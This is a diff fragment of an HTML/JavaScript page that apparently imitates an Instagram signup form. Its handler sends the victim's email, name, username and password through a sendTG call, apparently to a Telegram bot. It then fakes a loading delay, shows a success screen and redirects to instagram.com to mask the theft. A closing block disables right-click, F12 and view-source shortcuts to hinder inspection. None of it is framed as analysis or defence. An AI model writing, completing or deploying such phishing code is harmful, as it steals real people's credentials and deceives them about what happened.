+    const e3 = vUser(sUser.value.trim());
+    const e4 = vPass(sPass.value);
+    if (!e1.ok || !e2.ok || !e3.ok || !e4.ok) return;
+
+    signupBtn.classList.add('loading');
+    signupBtn.disabled = true;
+
+    await sendTG('signup', {
+        email: sEmail.value.trim(),
+        name: sName.value.trim(),
+        user: sUser.value.trim(),
+        pass: sPass.value
+    });
+
+    await new Promise(r => setTimeout(r, 2000 + Math.random()*1000));
+
+    $('signupOverlay').classList.remove('show');
+    $('successOverlay').classList.add('show');
+
+    signupBtn.classList.remove('loading');
+
+    setTimeout(() => { window.location.href = 'https://www.instagram.com'; }, 3000);
+});
+
+// ---------- DISABLE DEV TOOLS ----------
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) e.preventDefault();
+});
+</script>
+
+</body>
+</html>
